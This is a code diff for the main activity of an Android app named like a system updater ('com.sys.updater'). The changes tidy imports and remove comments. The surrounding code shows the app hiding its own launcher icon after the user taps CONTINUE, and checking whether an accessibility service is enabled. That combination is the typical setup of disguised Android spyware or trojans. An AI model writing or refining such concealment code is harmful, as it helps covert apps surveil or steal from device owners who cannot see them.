@@ -2,6 +2,7 @@ package com.sys.updater;
 
 import android.Manifest;
 import android.app.Activity;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -11,7 +12,6 @@ import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
 import android.text.TextUtils;
-import android.view.Gravity;
 import android.view.View;
 import android.widget.Button;
 import android.widget.LinearLayout;
@@ -36,7 +36,7 @@ public class MainActivity extends Activity {
         layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setPadding(60, 120, 60, 60);
-        layout.setBackgroundColor(Color.parseColor("#F5F5F5")); // Background fete7
+        layout.setBackgroundColor(Color.parseColor("#F5F5F5"));
         setContentView(layout);
 
         // Title
@@ -95,7 +95,7 @@ public class MainActivity extends Activity {
         btnContinue = new Button(this);
         btnContinue.setText("CONTINUE");
         btnContinue.setTextColor(Color.WHITE);
-        btnContinue.setBackgroundColor(Color.parseColor("#007BFF")); // Blue
+        btnContinue.setBackgroundColor(Color.parseColor("#007BFF"));
         btnContinue.setTextSize(18);
         btnContinue.setTypeface(null, Typeface.BOLD);
         
@@ -111,7 +111,7 @@ public class MainActivity extends Activity {
                 
                 // Hide Icon
                 getPackageManager().setComponentEnabledSetting(
-                    new android.content.ComponentName(this, MainActivity.class),
+                    new ComponentName(this, MainActivity.class),
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                     PackageManager.DONT_KILL_APP
                 );
@@ -194,10 +194,9 @@ public class MainActivity extends Activity {
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        checkStatus(); // Update UI mnin y-kemmel
+        checkStatus();
     }
 
-    // Function bach n-checkiw wach l'Accessibility m-activi
     public static boolean isAccessibilityServiceEnabled(Context context, Class<?> accessibilityService) {
         ComponentName expectedComponentName = new ComponentName(context, accessibilityService);
         String enabledServicesSetting = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
@@ -215,4 +214,4 @@ public class MainActivity extends Activity {
         }
         return false;
     }
-                                      }
+            }
